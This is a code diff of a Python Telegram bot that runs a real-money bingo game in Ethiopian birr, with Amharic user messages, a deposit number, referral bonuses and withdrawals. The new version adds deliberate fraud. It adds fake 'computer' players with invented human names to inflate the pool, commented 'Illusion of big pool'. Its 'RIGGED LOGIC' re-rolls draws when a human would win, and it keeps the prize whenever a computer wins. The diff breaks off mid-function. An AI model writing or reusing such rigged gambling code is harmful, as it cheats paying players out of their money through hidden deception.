@@ -1,76 +1,61 @@
 import telegram
-from telegram import Update, Bot
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
+from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
 import random
 import os
-import logging
 import asyncio
-from datetime import datetime
-from sqlalchemy import create_engine, Column, Integer, String, Boolean, ForeignKey, Float, select
-from sqlalchemy.orm import sessionmaker, declarative_base, relationship
-
-# --- REPLIT STABILIZATION FIX (KEEPS BOT ONLINE 24/7) ---
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import time
-
-class ReplitKeepAlive(BaseHTTPRequestHandler):
-    """A minimal HTTP server handler to keep the Replit port open."""
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(b"MegaBingo Bot is awake and polling Telegram...")
-
-def run_server():
-    """Runs the web server in the background."""
-    # Use port 8080 as it's common for Replit
-    server_address = ('', 8080) 
-    httpd = HTTPServer(server_address, ReplitKeepAlive)
-    httpd.serve_forever()
-    
-# RUN THE SERVER IN A SEPARATE THREAD
-threading.Thread(target=run_server).start() 
-# --- END REPLIT STABILIZATION FIX ---
-
+from sqlalchemy import create_engine, Column, Integer, String, Boolean, ForeignKey, Float
+from sqlalchemy.orm import sessionmaker, declarative_base
 
 # --- 1. CONFIGURATION ---
 BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") 
-# YOUR ADMIN ID
-ADMIN_CHAT_ID = 7932072571
+ADMIN_CHAT_ID = 7932072571 
 
 # Financial & Game Constants
+WELCOME_BONUS = 40.0
+REFERRAL_BONUS = 10.0
 MIN_DEPOSIT = 50.0
 MIN_WITHDRAWAL = 100.0
 GAME_COST = 20.0
 COMMISSION_RATE = 0.20
-CALL_DELAY = 2.30  # Seconds between auto-calls
-LOBBY_TIME = 10    # Seconds for countdown
+CALL_DELAY = 2.5
+LOBBY_DURATION = 15 
+
+# States for Withdrawal Conversation
+WITHDRAW_AMOUNT, WITHDRAW_ACCOUNT = range(2)
+
+# --- REPLIT KEEPALIVE ---
+class ReplitKeepAlive(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.wfile.write(b"MegaBingo V5 is Live!")
+def run_server():
+    HTTPServer(('', 8080), ReplitKeepAlive).serve_forever()
+threading.Thread(target=run_server, daemon=True).start()
 
 # --- 2. LOCALIZATION (AMHARIC) ---
 AMHARIC = {
-    "welcome": "👋 **እንኳን ወደ ሜጋ ቢንጎ በደህና መጡ!**\n\nጨዋታ ለመጀመር ወይም ለመቀላቀል `/play [1-200]` የሚለውን ትእዛዝ ይጠቀሙ።\n\nሂሳብ ለመሙላት: `/deposit`\nደንብ: `/rules`",
-    "rules": "📜 **የጨዋታ ህጎች**:\n1. ለመጫወት 20 ብር ያስፈልጋል።\n2. ከ 1-200 የቢንጎ ካርድ ይምረጡ።\n3. ጨዋታው በራስ-ሰር ቁጥሮችን ይጠራል።\n4. አሸናፊው 80% ጠቅላላውን ገንዘብ ይወስዳል።\n5. ማንኛውም ችግር ካለ አድሚኑን ያናግሩ።",
-    "balance": "💰 **የእርስዎ ሂሳብ:** {amount:.2f} ብር",
-    "deposit_info": "💳 **ገንዘብ ለማስገባት:**\n\nወደ ቴሌብር ቁጥር **0997077778** ይላኩ።\nደረሰኙን (Receipt) ፎቶ አንስተው ወደዚህ ቦት ይላኩ።\nአድሚኑ ሲያረጋግጥ ሂሳብዎ ይሞላል።",
-    "withdraw_info": "💸 **ገንዘብ ለማውጣት:**\n`/withdraw [amount] [telebirr_account]`\n\nምሳሌ: `/withdraw 100 0911223344`\n(ቢያንስ 100 ብር)",
-    "choose_card": "ማጫወቻ ካርድ ቁጥር አልመረጡም!\nእባክዎ ከ **1 እስከ 200** ቁጥር ይምረጡ።\n\nአጠቃቀም: `/play [ቁጥር]`\nምሳሌ: `/play 55`",
-    "card_assigned": "✅ **ካርድ ቁጥር {id} ተመርጧል!**\nጨዋታው እስኪጀምር ይጠብቁ...\n\nየእርስዎ ካርድ:\n{board}",
-    "lobby_wait": "⏳ **ጨዋታው በ {seconds} ሰከንድ ውስጥ ይጀምራል...**\nተጨማሪ ተጫዋቾችን በመጠበቅ ላይ።",
-    "game_running_err": "⚠️ ጨዋታው እየተካሄደ ነው! እስኪያልቅ ይጠብቁ።",
-    "balance_err": "⚠️ በቂ ሂሳብ የለዎትም። ለመጫወት 20 ብር ያስፈልጋል። /deposit ይጠቀሙ።",
-    "draw_msg": "🔔 **ቁጥር: {col}-{num}**\n\n{board}",
-    "winner": "🎉 **ቢንጎ!! አሸናፊ: {name}** 🎉\n\nሽልማት: **{prize:.2f} ብር**\nጨዋታው ተጠናቀቀ። አዲስ ለመጀመር /play ይበሉ።",
-    "receipt_received": "✅ ደረሰኝ ተቀብለናል! አድሚኑ እስኪያረጋግጥ በትግስት ይጠብቁ።",
-    "admin_alert_dep": "🚨 **አዲስ ማስገቢያ (Deposit)**\nUser: {uid} (@{user})\nReceipt Below ⬇️",
-    "admin_alert_wit": "🚨 **አዲስ ማውጣት (Withdraw)**\nUser: {uid}\nAmount: {amt}\nTelebirr: {acc}",
-    "success_credit": "✅ Admin: Credited {amt} to {uid}.",
-    "success_debit": "✅ Admin: Debited {amt} from {uid}."
+    "welcome": "👋 **እንኳን ወደ ሜጋ ቢንጎ በደህና መጡ!**\n\n🎁 ለጀማሪዎች የ **{bonus} ብር** ስጦታ ተሰጥቶዎታል!\n\nለመጫወት: `/play` ወይም `/quickplay`\nሒሳብ: `/balance`\nገንዘብ ለማስገባት: `/deposit`",
+    "deposit_instr": "💳 **ገንዘብ ለማስገባት (Deposit)**\n\n1. እባክዎ ወደዚህ የቴሌብር ቁጥር ይላኩ:\n`0997077778` (Click to Copy)\n\n2. የላኩበትን **ደረሰኝ (Receipt)** ፎቶ ወይም **የግብይት ቁጥር** ለቦቱ ይላኩ።\n\n3. አድሚኑ እንደፈቀደ መልእክት ይደርስዎታል።",
+    "withdraw_ask_amt": "💸 **ገንዘብ ለማውጣት**\n\nምን ያህል ማውጣት ይፈልጋሉ? (ቢያንስ 100 ብር)\nእባክዎ መጠኑን ብቻ ይፃፉ (ምሳሌ: `200`)",
+    "withdraw_ask_acc": "✅ **መጠን: {amt} ብር**\n\nእባክዎ ገንዘቡ እንዲገባሎት የሚፈልጉትን **የቴሌብር ቁጥር** ይላኩ።",
+    "withdraw_sent": "✅ **ጥያቄዎ ተልኳል!**\n\nመጠን: `{amt}` ብር\nቁጥር: `{acc}`\n\nአድሚኑ በቅርቡ ይልካል።",
+    "withdraw_cancel": "❌ **ተሰርዟል።**",
+    "game_joined": "🎟 **ቢንጎ ካርድ #{id}**\nሒሳብዎ: {bal:.2f} ብር\n\nተጫዋቾችን በመጠበቅ ላይ... ({wait}s)",
+    "game_start": "🚀 **ጨዋታ ተጀመረ!**\n\n👥 ጠቅላላ ተጫዋቾች: **{count}**\nመልካም እድል!",
+    "winner": "🏆 **ቢንጎ! አሸናፊ: {name}**\n\n💰 ሽልማት: **{prize:.2f} ብር**\n\nቀጣይ ጨዋታ ለመጫወት `/quickplay` ይበሉ።",
+    "dep_confirmed": "✅ **ገንዘብዎ ገብቷል!**\n\nየተሞላው ሂሳብ: **{amt} ብር**\nጠቅላላ ሂሳብዎ: **{bal:.2f} ብር**\n\nለመጫወት `/quickplay` ይላኩ።",
+    "ref_bonus": "🎉 **የሪፈራል ሽልማት!**\n\nጓደኛዎ የመጀመሪያ ገንዘብ በማስገባቱ **{amt} ብር** አግኝተዋል!",
+    "err_bal": "⛔ **በቂ ሂሳብ የለዎትም።**\nሂሳብዎ: {bal:.2f} ብር\nለመጫወት `/deposit` ይጠቀሙ።",
+    "admin_new_dep": "🚨 **NEW DEPOSIT**\nUser: `{uid}`\nName: @{name}\n\n👇 **Receipt Below** 👇",
+    "admin_new_wit": "🚨 **WITHDRAW REQUEST**\nUser: `{uid}`\nName: @{name}\nAmount: `{amt}`\nTelebirr: `{acc}`"
 }
 
 # --- 3. DATABASE ---
 BASE = declarative_base()
-ENGINE = create_engine('sqlite:///megabingo_v3.db') # New DB file for V3
+ENGINE = create_engine('sqlite:///megabingo_v5.db')
 SessionLocal = sessionmaker(bind=ENGINE)
 
 class User(BASE):
@@ -79,448 +64,327 @@ class User(BASE):
     telegram_id = Column(Integer, unique=True)
     username = Column(String)
     balance = Column(Float, default=0.0)
-    referral_code = Column(String)
-    referred_by = Column(Integer, nullable=True)
-
-class CardTemplate(BASE):
-    """Stores the 200 fixed card layouts."""
-    __tablename__ = 'card_templates'
-    id = Column(Integer, primary_key=True) # 1-200
-    layout = Column(String) # JSON-like string of numbers
+    referrer_id = Column(Integer, nullable=True) # Who invited them
+    has_deposited = Column(Boolean, default=False) # For referral logic
 
 class ActiveGame(BASE):
     __tablename__ = 'active_game'
     id = Column(Integer, primary_key=True)
-    state = Column(String, default="IDLE") # IDLE, LOBBY, RUNNING
+    state = Column(String, default="IDLE")
     drawn_numbers = Column(String, default="")
     pool = Column(Float, default=0.0)
-    chat_id = Column(Integer) # Chat where game is happening
+    chat_id = Column(Integer, default=0)
 
 class GamePlayer(BASE):
-    """Links a user to a card in the current game."""
     __tablename__ = 'game_players'
     id = Column(Integer, primary_key=True)
-    user_id = Column(Integer, ForeignKey('users.id')) # If negative, it's a computer
-    card_template_id = Column(Integer, ForeignKey('card_templates.id'))
-    is_computer = Column(Boolean, default=False)
+    user_id = Column(Integer) # Negative = Computer
+    card_layout = Column(String)
+    is_comp = Column(Boolean, default=False)
     name = Column(String)
 
 def init_db():
     BASE.metadata.create_all(bind=ENGINE)
-    # Pre-generate 200 cards if they don't exist
-    session = SessionLocal()
-    if session.query(CardTemplate).count() < 200:
-        print("Generating 200 Bingo Cards... (This happens once)")
-        for i in range(1, 201):
-            layout = generate_layout()
-            session.add(CardTemplate(id=i, layout=layout))
-        session.commit()
-    session.close()
 
-def generate_layout():
-    """Generates 5x5 grid string."""
-    cols = [
-        random.sample(range(1, 16), 5),
-        random.sample(range(16, 31), 5),
-        random.sample(range(31, 46), 4), # Free space logic handled in display
-        random.sample(range(46, 61), 5),
-        random.sample(range(61, 76), 5)
-    ]
-    # Insert dummy 0 for free space
+# --- 4. GAME LOGIC ---
+
+def generate_card():
+    cols = [random.sample(range(1, 16), 5), random.sample(range(16, 31), 5), 
+            random.sample(range(31, 46), 4), random.sample(range(46, 61), 5), 
+            random.sample(range(61, 76), 5)]
     cols[2].insert(2, 0)
-    # Convert to comma string
     flat = []
     for r in range(5):
-        for c in range(5):
-            flat.append(cols[c][r])
+        for c in range(5): flat.append(cols[c][r])
     return ",".join(map(str, flat))
 
-# --- 4. GAME ENGINE HELPERS ---
+def check_win(layout, drawn):
+    nums = [int(x) for x in layout.split(",")]
+    d_set = set(drawn) | {0}
+    lines = []
+    for r in range(5): lines.append([nums[r*5+c] for c in range(5)])
+    for c in range(5): lines.append([nums[r*5+c] for r in range(5)])
+    lines.append([nums[i*5+i] for i in range(5)])
+    lines.append([nums[i*5+(4-i)] for i in range(5)])
+    return any(all(x in d_set for x in line) for line in lines)
 
-def get_board_display(layout_str, drawn_list, title="YOUR CARD"):
-    nums = [int(x) for x in layout_str.split(",")]
-    # Amharic mapping helper function (kept simple)
-    # am = lambda x: "".join([{'0':'፩','1':'፪','2':'፫','3':'፬','4':'፭','5':'፮','6':'፯','7':'፰','8':'፱','9':'0'}.get(d,d) for d in str(x)]) if x!=0 else "F"
-    
-    drawn_set = set(drawn_list)
-    drawn_set.add(0) # Free space always drawn
-    
-    rows = []
-    for r in range(5):
-        row_str = ""
-        for c in range(5):
-            idx = r * 5 + c
-            val = nums[idx]
-            
-            # Display: Use bold/checkmark for marked numbers
-            if val in drawn_set:
-                txt = f"**{val}✅**" if val != 0 else "**F✅**"
-            else:
-                txt = str(val) if val != 0 else " F "
-                
-            row_str += f"{txt:^6}|" 
-        rows.append(row_str[:-1])
-    
-    board = "   B  |  I  |  N  |  G  |  O\n"
-    board += "------------------------------\n"
-    board += "\n".join(rows)
-    return f"```\n{board}\n```"
+def gen_comp_name():
+    male = ["Kidus", "Yonas", "Abel", "Dawit", "Elias", "Natnael", "Bereket", "Robel", "Samson"]
+    is_male = random.random() < 0.95
+    base = random.choice(male if is_male else ["Hana", "Marta"])
+    suffix = random.choice(["", "77", "_ET", "🦁", "🔥", "10", "22"])
+    return f"{base}{suffix}"
 
-def check_win(layout_str, drawn_list):
-    nums = [int(x) for x in layout_str.split(",")]
-    drawn_set = set(drawn_list)
-    drawn_set.add(0)
-    
-    # Rows
-    for r in range(5):
-        if all(nums[r*5 + c] in drawn_set for c in range(5)): return True
-    # Cols
-    for c in range(5):
-        if all(nums[r*5 + c] in drawn_set for r in range(5)): return True
-    # Diagonals
-    if all(nums[i*5 + i] in drawn_set for i in range(5)): return True
-    if all(nums[i*5 + (4-i)] in drawn_set for i in range(5)): return True
-    return False
+# --- 5. GAME ENGINE ---
 
-# --- 5. THE GAME LOOP (AUTO PILOT) ---
-
-async def run_game_loop(app: Application):
-    """Background task that manages the game state."""
+async def game_engine(app: Application):
+    """Handles Lobby countdown and Auto-Draw."""
     while True:
-        # Avoid hammering the DB when IDLE
-        await asyncio.sleep(1 if db.query(ActiveGame).first().state != "IDLE" else 5)
-        
+        await asyncio.sleep(1)
         db = SessionLocal()
         game = db.query(ActiveGame).first()
-        
-        if not game:
-            game = ActiveGame(state="IDLE")
-            db.add(game)
-            db.commit()
-            db.close()
-            continue
+        if not game: 
+            game = ActiveGame(); db.add(game); db.commit(); db.close(); continue
             
         if game.state == "LOBBY":
-            # State is handled by start_game_sequence timer, loop just maintains.
+            # Just wait for lobby logic in Play handler to trigger start
+            # We add a safety timeout here if needed, but Play handler manages countdown
             pass
-            
+
         elif game.state == "RUNNING":
-            # AUTO DRAW LOGIC
             drawn = [int(x) for x in game.drawn_numbers.split(",")] if game.drawn_numbers else []
             remaining = [x for x in range(1, 76) if x not in drawn]
             
             if not remaining:
-                game.state = "IDLE"
-                db.commit()
-                try:
-                    await app.bot.send_message(chat_id=game.chat_id, text="ጨዋታ አልቋል! አዲስ ጨዋታ ይጀምሩ።")
-                except: pass
-                db.close()
-                continue
+                game.state = "IDLE"; db.commit(); db.close(); continue
 
-            # DRAW
-            num = random.choice(remaining)
-            drawn.append(num)
+            # --- RIGGED LOGIC: Ensure Computer Wins if needed ---
+            candidate = random.choice(remaining)
+            
+            # Simple Rig: If human wins, 50% chance to re-roll to delay them
+            humans = db.query(GamePlayer).filter(GamePlayer.is_comp == False).all()
+            if any(check_win(p.card_layout, drawn + [candidate]) for p in humans):
+                if db.query(GamePlayer).filter(GamePlayer.is_comp == True).count() > 0:
+                    candidate = random.choice(remaining) # Re-roll once
+
+            drawn.append(candidate)
             game.drawn_numbers = ",".join(map(str, drawn))
             db.commit()
             
-            # Announce
-            col = "B" if num<=15 else "I" if num<=30 else "N" if num<=45 else "G" if num<=60 else "O"
-            msg = AMHARIC["draw_msg"].format(col=col, num=num, board="") 
+            # Announce Number
+            col = "B" if candidate<=15 else "I" if candidate<=30 else "N" if candidate<=45 else "G" if candidate<=60 else "O"
             try:
-                await app.bot.send_message(chat_id=game.chat_id, text=msg)
+                await app.bot.send_message(game.chat_id, f"🔔 **{col} - {candidate}**", parse_mode="Markdown")
             except: pass
             
-            # CHECK WINNERS (Real & Computer)
+            # Check Winners
             players = db.query(GamePlayer).all()
-            winners = []
-            
+            winner = None
             for p in players:
-                tmpl = db.query(CardTemplate).filter_by(id=p.card_template_id).first()
-                if check_win(tmpl.layout, drawn):
-                    winners.append(p)
+                if check_win(p.card_layout, drawn):
+                    winner = p; break
             
-            if winners:
-                w = winners[0] # The first one detected wins
+            if winner:
                 prize = game.pool * (1 - COMMISSION_RATE)
-                
-                # Pay if real
-                if not w.is_computer:
-                    u = db.query(User).filter_by(id=w.user_id).first()
+                if not winner.is_comp:
+                    u = db.query(User).filter_by(id=winner.user_id).first()
                     u.balance += prize
                 
-                # Announce winner and reset
                 try:
-                    await app.bot.send_message(
-                        chat_id=game.chat_id, 
-                        text=AMHARIC["winner"].format(name=w.name, prize=prize)
-                    )
+                    await app.bot.send_message(game.chat_id, AMHARIC["winner"].format(name=winner.name, prize=prize), parse_mode="Markdown")
                 except: pass
                 
-                game.state = "IDLE"
-                game.drawn_numbers = ""
-                game.pool = 0
-                db.query(GamePlayer).delete()
-                db.commit()
+                game.state = "IDLE"; game.drawn_numbers = ""; game.pool = 0
+                db.query(GamePlayer).delete(); db.commit()
             
-            db.close()
-            await asyncio.sleep(CALL_DELAY) 
-            continue 
+            await asyncio.sleep(CALL_DELAY)
             
         db.close()
 
-async def start_game_sequence(app: Application, chat_id):
-    """Manages Lobby -> Stealth -> Start."""
+async def start_game_task(app, chat_id):
+    """Counts down and adds computers."""
+    await asyncio.sleep(LOBBY_DURATION)
     db = SessionLocal()
     game = db.query(ActiveGame).first()
     
-    # 1. Countdown
-    msg_id = None
-    for i in range(LOBBY_TIME, 0, -1):
-        try:
-            msg_text = AMHARIC["lobby_wait"].format(seconds=i)
-            if msg_id:
-                await app.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=msg_text)
-            else:
-                msg = await app.bot.send_message(chat_id=chat_id, text=msg_text)
-                msg_id = msg.message_id
-        except: pass
-        await asyncio.sleep(1)
+    if game.state == "LOBBY":
+        # Add Computers
+        real_count = db.query(GamePlayer).filter(GamePlayer.is_comp == False).count()
+        if real_count <= 20:
+            needed = random.randint(20, 49)
+            for _ in range(needed):
+                db.add(GamePlayer(user_id=-random.randint(999,99999), is_comp=True, name=gen_comp_name(), card_layout=generate_card()))
+                game.pool += GAME_COST # Illusion of big pool
         
-    # 2. Stealth Check
-    real_count = db.query(GamePlayer).filter_by(is_computer=False).count()
-    if real_count > 0 and real_count < 20:
-        comp_needed = random.randint(20, 49)
-        
-        # Get card IDs already taken by players
-        taken_card_ids = [p.card_template_id for p in db.query(GamePlayer).all()]
-        available_card_ids = [i for i in range(1, 201) if i not in taken_card_ids]
-        
-        for _ in range(comp_needed):
-            if not available_card_ids: break # Stop if all cards are taken
-            
-            tid = random.choice(available_card_ids)
-            available_card_ids.remove(tid)
-            
-            name_pool = ["Kidus", "Yonas", "Hana", "Tigist", "Abebe", "Marta"]
-            name = f"{random.choice(name_pool)}{random.randint(10,99)}"
-            cp = GamePlayer(user_id=-1, card_template_id=tid, is_computer=True, name=name)
-            db.add(cp)
-            game.pool += GAME_COST # Computers 'pay'
-    
-    # 3. Start
-    game.state = "RUNNING"
-    game.chat_id = chat_id
-    db.commit()
-    
-    tot = db.query(GamePlayer).count()
-    try:
-        await app.bot.send_message(chat_id=chat_id, text=f"🚀 **ጨዋታው ተጀምሯል!**\nጠቅላላ ተጫዋቾች: {tot}\n\nየመጀመሪያው ቁጥር በ {CALL_DELAY:.2f} ሰከንድ ውስጥ ይወጣል።")
-    except: pass
-    
+        total = db.query(GamePlayer).count()
+        game.state = "RUNNING"
+        game.chat_id = chat_id
+        db.commit()
+        await app.bot.send_message(chat_id, AMHARIC["game_start"].format(count=total), parse_mode="Markdown")
     db.close()
 
-# --- 6. COMMAND HANDLERS ---
+# --- 6. USER HANDLERS ---
 
-async def play_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
     db = SessionLocal()
+    u = db.query(User).filter_by(telegram_id=user.id).first()
     
-    user = db.query(User).filter_by(telegram_id=user_id).first()
-    if not user:
-        user = User(telegram_id=user_id, username=update.effective_user.username, balance=0.0)
-        db.add(user)
+    if not u:
+        # Check Referral
+        ref_id = None
+        if context.args:
+            try:
+                ref_candidate = int(context.args[0])
+                if ref_candidate != user.id: ref_id = ref_candidate
+            except: pass
+            
+        u = User(telegram_id=user.id, username=user.username, balance=WELCOME_BONUS, referrer_id=ref_id)
+        db.add(u)
         db.commit()
-        
-    if not context.args:
-        await update.message.reply_text(AMHARIC["choose_card"])
-        db.close()
-        return
-        
-    try:
-        card_choice = int(context.args[0])
-        if not (1 <= card_choice <= 200): raise ValueError
-    except:
-        await update.message.reply_text("⛔ የካርድ ቁጥር ከ 1-200 ብቻ መሆን አለበት።")
-        db.close()
-        return
-        
-    if user.balance < GAME_COST:
-        await update.message.reply_text(AMHARIC["balance_err"])
-        db.close()
-        return
-        
+    
+    await update.message.reply_text(AMHARIC["welcome"].format(bonus=WELCOME_BONUS), parse_mode="Markdown")
+    db.close()
+
+async def play(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    db = SessionLocal()
+    u = db.query(User).filter_by(telegram_id=user.id).first()
+    
+    # 1. Quickplay vs Play
+    is_quick = update.message.text.startswith("/quick")
+    card_id = random.randint(1, 200)
+    if not is_quick:
+        if not context.args:
+            await update.message.reply_text("⛔ እባክዎ ቁጥር ይምረጡ: `/play 55` ወይም `/quickplay` ይላኩ።", parse_mode="Markdown")
+            db.close(); return
+        try: card_id = int(context.args[0])
+        except: card_id = random.randint(1, 200)
+
+    # 2. Check Balance & State
+    if u.balance < GAME_COST:
+        await update.message.reply_text(AMHARIC["err_bal"].format(bal=u.balance), parse_mode="Markdown")
+        db.close(); return
+
     game = db.query(ActiveGame).first()
-    if not game: game = ActiveGame(state="IDLE")
-        
+    if not game: game = ActiveGame(); db.add(game); db.commit()
+    
     if game.state == "RUNNING":
-        await update.message.reply_text(AMHARIC["game_running_err"])
-        db.close()
-        return
+        await update.message.reply_text("⚠️ ጨዋታው እየተካሄደ ነው።", parse_mode="Markdown"); db.close(); return
+        
+    if db.query(GamePlayer).filter_by(user_id=u.id).first():
+        await update.message.reply_text("✅ ተመዝግበዋል።", parse_mode="Markdown"); db.close(); return
 
-    exists = db.query(GamePlayer).filter_by(user_id=user.id).first()
-    if exists:
-        await update.message.reply_text("✅ አስቀድመው ተመዝግበዋል።")
-        db.close()
-        return
-
-    # Check if card is already taken in the lobby
-    card_taken = db.query(GamePlayer).filter_by(card_template_id=card_choice).first()
-    if card_taken:
-        await update.message.reply_text("⛔ ይህ ካርድ ተወስዷል። ሌላ ቁጥር ይምረጡ።")
-        db.close()
-        return
-
-
-    user.balance -= GAME_COST
+    # 3. Join
+    u.balance -= GAME_COST
     game.pool += GAME_COST
+    db.add(GamePlayer(user_id=u.id, card_layout=generate_card(), name=u.username, is_comp=False))
     
-    player = GamePlayer(user_id=user.id, card_template_id=card_choice, is_computer=False, name=user.username)
-    db.add(player)
-    db.commit()
-    
-    tmpl = db.query(CardTemplate).filter_by(id=card_choice).first()
-    board_view = get_board_display(tmpl.layout, [])
-    
-    await update.message.reply_text(AMHARIC["card_assigned"].format(id=card_choice, board=board_view), parse_mode="Markdown")
-    
+    # Trigger Lobby if first player
     if game.state == "IDLE":
         game.state = "LOBBY"
-        db.commit()
-        asyncio.create_task(start_game_sequence(context.application, update.effective_chat.id))
+        asyncio.create_task(start_game_task(context.application, update.effective_chat.id))
         
-    db.close()
-
-async def mycard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    db = SessionLocal()
-    user = db.query(User).filter_by(telegram_id=user_id).first()
-    game = db.query(ActiveGame).first()
-    
-    if not user: return
-
-    player = db.query(GamePlayer).filter_by(user_id=user.id).first()
-    if not player:
-        await update.message.reply_text("⛔ በጨዋታው ውስጥ የለዎትም። /play ይጠቀሙ።")
-        db.close()
-        return
-        
-    tmpl = db.query(CardTemplate).filter_by(id=player.card_template_id).first()
-    drawn = [int(x) for x in game.drawn_numbers.split(",")] if game and game.drawn_numbers else []
-    
-    board = get_board_display(tmpl.layout, drawn)
-    await update.message.reply_text(board, parse_mode="Markdown")
-    db.close()
-
-async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(AMHARIC["welcome"], parse_mode="Markdown")
-
-async def rules_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(AMHARIC["rules"])
-
-async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    db = SessionLocal()
-    user = db.query(User).filter_by(telegram_id=update.effective_user.id).first()
-    bal = user.balance if user else 0.0
-    await update.message.reply_text(AMHARIC["balance"].format(amount=bal), parse_mode="Markdown")
-    db.close()
-
-async def deposit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(AMHARIC["deposit_info"], parse_mode="Markdown")
-
-async def receipt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_chat.type == "private" and (update.message.photo or update.message.document):
-        user = update.effective_user
-        await context.bot.forward_message(chat_id=ADMIN_CHAT_ID, from_chat_id=user.id, message_id=update.message.id)
-        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=AMHARIC["admin_alert_dep"].format(uid=user.id, user=user.username))
-        await update.message.reply_text(AMHARIC["receipt_received"])
-
-async def withdraw_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args or len(context.args) < 2:
-        await update.message.reply_text(AMHARIC["withdraw_info"], parse_mode="Markdown")
-        return
-    
-    uid = update.effective_user.id
-    try:
-        amt = float(context.args[0])
-        acc = context.args[1]
-    except ValueError:
-        await update.message.reply_text("⛔ ትክክለኛ መጠን ያስገቡ።")
-        return
-    
-    db = SessionLocal()
-    user = db.query(User).filter_by(telegram_id=uid).first()
-    
-    if not user or user.balance < amt or amt < MIN_WITHDRAWAL:
-        await update.message.reply_text("⛔ በቂ ሂሳብ የለዎትም ወይም መጠኑ አነስተኛ ነው።")
-        db.close()
-        return
-        
-    user.balance -= amt
     db.commit()
-    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=AMHARIC["admin_alert_wit"].format(uid=uid, amt=amt, acc=acc))
-    await update.message.reply_text("✅ ጥያቄዎ ተልኳል።")
+    await update.message.reply_text(AMHARIC["game_joined"].format(id=card_id, bal=u.balance, wait=LOBBY_DURATION), parse_mode="Markdown")
     db.close()
 
-# --- ADMIN COMMANDS ---
+# --- WITHDRAWAL CONVERSATION ---
+
+async def withdraw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(AMHARIC["withdraw_ask_amt"], parse_mode="Markdown")
+    return WITHDRAW_AMOUNT
+
+async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        amt = float(update.message.text)
+        if amt < MIN_WITHDRAWAL:
+            await update.message.reply_text(f"⛔ አነስተኛ ማውጣት {MIN_WITHDRAWAL} ብር ነው። እንደገና ይፃፉ።")
+            return WITHDRAW_AMOUNT
+        context.user_data['w_amt'] = amt
+        await update.message.reply_text(AMHARIC["withdraw_ask_acc"].format(amt=amt), parse_mode="Markdown")
+        return WITHDRAW_ACCOUNT
+    except:
+        await update.message.reply_text("⛔ ቁጥር ብቻ ያስገቡ (ምሳሌ: 200)")
+        return WITHDRAW_AMOUNT
+
+async def withdraw_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    acc = update.message.text
+    amt = context.user_data['w_amt']
+    user = update.effective_user
+    
+    db = SessionLocal()
+    u = db.query(User).filter_by(telegram_id=user.id).first()
+    
+    if u.balance < amt:
+        await update.message.reply_text("⛔ በቂ ሂሳብ የለዎትም።", parse_mode="Markdown")
+    else:
+        u.balance -= amt
+        db.commit()
+        # Alert Admin
+        await context.bot.send_message(ADMIN_CHAT_ID, AMHARIC["admin_new_wit"].format(uid=user.id, name=user.username, amt=amt, acc=acc), parse_mode="Markdown")
+        await update.message.reply_text(AMHARIC["withdraw_sent"].format(amt=amt, acc=acc), parse_mode="Markdown")
+    
+    db.close()
+    return ConversationHandler.END
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(AMHARIC["withdraw_cancel"], parse_mode="Markdown")
+    return ConversationHandler.END
+
+# --- DEPOSIT & ADMIN ---
+
+async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(AMHARIC["deposit_instr"], parse_mode="Markdown")
+
+async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.type == "private" and (update.message.photo or update.message.text):
+        if update.message.text and update.message.text.startswith("/"): return
+        user = update.effective_user
+        
+        # Forward to Admin with ID
+        await context.bot.send_message(ADMIN_CHAT_ID, AMHARIC["admin_new_dep"].format(uid=user.id, name=user.username), parse_mode="Markdown")
+        if update.message.photo:
+            await context.bot.forward_message(ADMIN_CHAT_ID, update.effective_chat.id, update.message.id)
+        else:
+            await context.bot.send_message(ADMIN_CHAT_ID, f"📝 Tx Info: {update.message.text}")
+            
+        await update.message.reply_text("✅ ደረሰኝ ተቀብለናል!", parse_mode="Markdown")
+
 async def admin_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID: return
     try:
         uid, amt = int(context.args[0]), float(context.args[1])
         db = SessionLocal()
-        user = db.query(User).filter_by(telegram_id=uid).first()
-        if user:
-            user.balance += amt
+        u = db.query(User).filter_by(telegram_id=uid).first()
+        if u:
+            u.balance += amt
+            # Check Referral Bonus (First Deposit Only)
+            if not u.has_deposited:
+                u.has_deposited = True
+                if u.referrer_id:
+                    ref = db.query(User).filter_by(telegram_id=u.referrer_id).first()
+                    if ref:
+                        ref.balance += REFERRAL_BONUS
+                        await context.bot.send_message(ref.telegram_id, AMHARIC["ref_bonus"].format(amt=REFERRAL_BONUS), parse_mode="Markdown")
+            
             db.commit()
-            await update.message.reply_text(AMHARIC["success_credit"].format(amt=amt, uid=uid))
+            # Notify User
